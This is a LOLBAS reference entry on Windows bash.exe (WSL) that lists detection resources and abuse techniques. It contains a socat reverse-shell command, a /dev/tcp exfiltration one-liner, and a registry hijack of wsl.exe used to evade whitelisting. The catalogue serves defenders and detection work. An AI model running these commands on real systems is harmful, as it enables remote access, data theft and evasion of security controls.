---
title: "Bash.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Bash/
fetched_at: 2026-09-20T17:09:24Z
license: unspecified
category: windows
---

File used by Windows subsystem for Linux

## Paths
- C:\Windows\System32\bash.exe
- C:\Windows\SysWOW64\bash.exe

## Resources
- [https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)
- [https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/](https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/)

## Acknowledgements
- Alex Ionescu ([@aionescu](https://twitter.com/@aionescu))
- Asif Matadar ([@d1r4c](https://twitter.com/@d1r4c))
- Liran Ravich, CardinalOps

## Detections
- BlockRule: [https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml)
- IOC: Child process from bash.exe

## Execute

1. Executes executable from bash.exe

```
bash.exe -c "{CMD}"
```

   - Use case: Performs execution of specified file, can be used as a defensive evasion.

   - Privileges required: User

   - Operating systems: Windows 10

   - ATT&CK® technique: T1202

   - Tags: Execute: CMD

2. Executes a reverse shell

```
bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
```

   - Use case: Performs execution of specified file, can be used as a defensive evasion.

   - Privileges required: User

   - Operating systems: Windows 10

   - ATT&CK® technique: T1202

   - Tags: Execute: CMD

3. Exfiltrate data

```
bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
```

   - Use case: Performs execution of specified file, can be used as a defensive evasion.

   - Privileges required: User

   - Operating systems: Windows 10

   - ATT&CK® technique: T1202

   - Tags: Execute: CMD

4. When executed, bash.exe queries the registry value of HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation, which contains a folder path (c:\program files\wsl by default). If the value points to another folder containing a file named wsl.exe, it will be executed instead of the legitimate wsl.exe in the program files folder.

```
bash.exe
```

   - Use case: Execute a payload as a child process of bash.exe while masquerading as WSL.

   - Privileges required: User

   - Operating systems: Windows 10, Windows Server 2019, Windows 11

   - ATT&CK® technique: T1218

   - Tags: Execute: CMD

5. Executes executable from bash.exe

```
bash.exe -c "{CMD}"
```

   - Use case: Performs execution of specified file, can be used to bypass Application Whitelisting.

   - Privileges required: User

   - Operating systems: Windows 10

   - ATT&CK® technique: T1202

   - Tags: Execute: CMD
